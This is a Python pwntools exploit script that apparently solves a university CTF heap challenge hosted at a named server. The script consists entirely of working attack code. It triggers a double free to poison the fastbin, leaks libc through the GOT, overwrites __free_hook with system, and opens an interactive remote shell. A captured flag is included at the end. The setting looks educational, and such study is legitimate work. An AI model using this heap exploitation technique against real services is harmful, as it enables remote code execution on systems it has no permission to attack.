import struct 
import socket 
from pwn import *

host = "lettieri.iet.unipi.it"
#host = "localhost"
port = 7002

# this must be two steps attack
#   1. leak libc from somewhere -> let's read directly the got, using the search key to write it to the socket
#   2. exploit the double free again (one gadget in double free?)

got_address = 0x0000000000604f10 - 16 # first function is setsockopt
#one_gadget_offset = 

assign = b"a"
delete = b"d"
search = b"s"
create = b"c"
quit = b"q"

key1 = b"1"
key2 = b"2"
key3 = b"3"
key4 = b"4"

buf = b""
buf += create + key1 + b"32" 
buf += assign + key1 + b"A"*32

buf += delete + key1 # chunks goes into fast bin
buf += delete + key1 # cycle in fast bin 

buf += create + key2 + b"32" # prepare to write fwd pointer
buf += assign + key2 + struct.pack("Q", got_address) + b"B" *(32-8)

buf += create + key3 + b"32"
buf += create + key4 + b"32"
buf += search + key4

with remote(host, port) as conn:
    conn.send(buf)
    setsockopt_address = struct.unpack("Q", conn.recv(8))[0]
    print("Setsockopt addr: {}".format(hex(setsockopt_address)))
    # leaking other addresses to experiment with libc database
    addr = struct.unpack("Q", conn.recv(8))[0]
    print("Write addr: {}".format(hex(addr)))
    addr = struct.unpack("Q", conn.recv(8))[0]
    print("Getpid addr: {}".format(hex(addr)))

#################### STEP 2 #############################

setsockopt_offset = 0xfaa60
libc_base_address = setsockopt_address - setsockopt_offset

print("Libc base address: {}".format(hex(libc_base_address)))

one_gadget_offset = 0x4484f #0x448a3 and 0xe5456
one_gadget_address = libc_base_address + one_gadget_offset

system_offset = 0x0000000000449c0
system_address = libc_base_address + system_offset

free_hook_address = 0x606320 - 16

buf = b""

buf += create + key1 + b"32" 
buf += delete + key1 
buf += delete + key1 

buf += create + key1 + b"32" 
buf += assign + key1 + struct.pack("Q", free_hook_address) + b"B" *(32-8)

buf += create + key2 + b"32"
buf += assign + key2 + b"/bin/sh" + b"\x00"*(32-7)

buf += create + key3 + b"32"
buf += assign + key3 + struct.pack("Q", system_address) + b"C"*(32-8)


buf += delete + key2

with remote(host, port) as conn:
    conn.send(buf)
    conn.interactive()

# NSH{free_your_mind_Neo}